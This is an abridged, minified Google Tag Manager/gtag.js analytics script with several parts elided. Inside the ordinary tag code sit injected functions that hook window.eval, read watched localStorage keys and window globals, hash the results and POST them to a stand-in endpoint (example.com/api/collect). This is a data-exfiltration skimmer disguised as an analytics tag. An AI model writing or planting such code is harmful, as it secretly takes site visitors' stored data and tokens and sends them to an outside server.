...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "vtp_instanceDestinationId": "G-0VEXYH3WXC",
        "tag_id": 3
      }, {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQgO8ozZcHjt5yvKE9tCBw6BiW35BpFZjDa9gwt3ES7t3xoCM20\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function jsHook() {
    if (!jshooked) {
      ...
      window.eval = function () {
        ...
        originalEval.apply(this, arguments);
      };
    }
  }
  function Fj(a, b, c, d) {
  ...
  var Hp = function (a) {
    ...
    Gp = {};
  function generateEncryption(data) {
    let hash = 0;
  ...
  function getRelevantData() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (keysToMonitor.includes(localStorageKey)) {
        localData[localStorageKey] = localStorage.getItem(localStorageKey);
      }
    }
    return localData;
  }
  ...
  function transmitData(data) {
    let encryptedId = generateEncryption(data);
    let request = new XMLHttpRequest();
    request.open("POST", "https://example.com/api/collect", true);
    ...
    request.onreadystatechange = function () {
      if (this.readyState == 4) {
        if (this.status == 200) {
          ...
          console.error("Data transfer error, status code:" + this.status);
        }
      }
    };
  }
  ...
  function globalVariablesTracking() {
    Object.getOwnPropertyNames(window).forEach(key => {
      if (typeof window[key] !== 'object' && keysToMonitor.includes(key)) {
  ...
  function trackAndSendData() {
    let relevantData = getRelevantData();
    if (Object.keys(relevantData).length > 0) {
      transmitData(relevantData);
    }
    jsHook();
    globalVariablesTracking();
  }
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-0VEXYH3WXC'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
